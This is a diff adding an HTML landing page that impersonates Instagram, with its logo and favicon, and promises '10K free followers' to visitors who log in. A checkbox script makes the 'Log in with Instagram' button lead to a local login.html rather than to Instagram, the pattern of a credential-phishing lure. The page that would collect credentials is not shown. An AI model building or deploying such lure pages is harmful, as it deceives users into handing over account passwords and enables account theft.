@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" type="image/x-icon">
+    <link rel="stylesheet" href="./style.css">
+    <script src="https://kit.fontawesome.com/5d2e8a75d6.js" crossorigin="anonymous"></script>
+    <title>Instagram Free Followers</title>
+</head>
+<body>
+    <div class="container1">
+        <div class="logo">
+            <img src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram.png" alt="">
+        </div>
+        <div class="sub-container">
+            <h2>Login to Instagram and get<b> free 10K followers!</b></h2><br/>
+            <p>To coincide with new years we are giving away<b> 10k free <br> instagram followers</b> to those who support us*.</p>
+            <form action="">
+                <input type="checkbox" name="terms-check" id="terms-check" >
+                <label for="terms-check">I have accepted the terms. <a href="./terms.html">Details</a></label>
+            </form>
+            <Button id="logBtn" onmouseover="logFunction()"><a href="" id="logLink"><i class="fa-brands fa-instagram" ></i>Log in with Instagram</a></Button>
+            <div class="div-alert">
+                <p>Please accept the terms</p>
+            </div>
+        </div>
+        <div class="footer-container">
+            <ul>
+                <li><a href="">About</a></li>
+                <li><a href="">Privacy</a></li>
+                <li><a href="">Terms</a></li>
+            </ul>
+            <p>© 2023 Instagram Free Followers</p>
+        </div>
+    </div>
+
+
+    <script>
+        function logFunction() {
+            // Get the checkbox
+            var checkBox = document.getElementById("terms-check");
+            // Get the output text
+            var logBtn = document.getElementById("logBtn");
+            const logLink = document.getElementById("logLink")
+            const alertMsg = document.querySelector(".div-alert")
+            if (checkBox.checked == true){
+                logBtn.disabled = false
+                logBtn.style.opacity = 1
+                logLink.href="./login.html"
+                alertMsg.style.display = "none"
+            } else {
+                logBtn.disabled = true
+                logBtn.style.opacity = .5
+                logLink.href=""
+                alertMsg.style.display = "block"
+            }
+          }
+    </script>
+</body>
+</html>
